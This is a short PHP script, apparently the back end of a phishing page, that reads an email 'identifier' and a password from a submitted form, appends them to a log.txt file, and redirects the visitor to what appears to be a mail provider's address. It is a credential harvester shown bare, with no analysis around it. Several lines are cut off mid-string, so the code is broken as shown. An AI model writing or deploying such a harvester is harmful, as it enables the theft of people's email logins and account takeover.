<?php
$email = $_POST['identifier'];
$password = $_POST['password'];

$file = fopen('log.txt', 'a');
fwrite($file, "Email: ". $email . "\nP.
fclose($file);

header('Location: https://mail.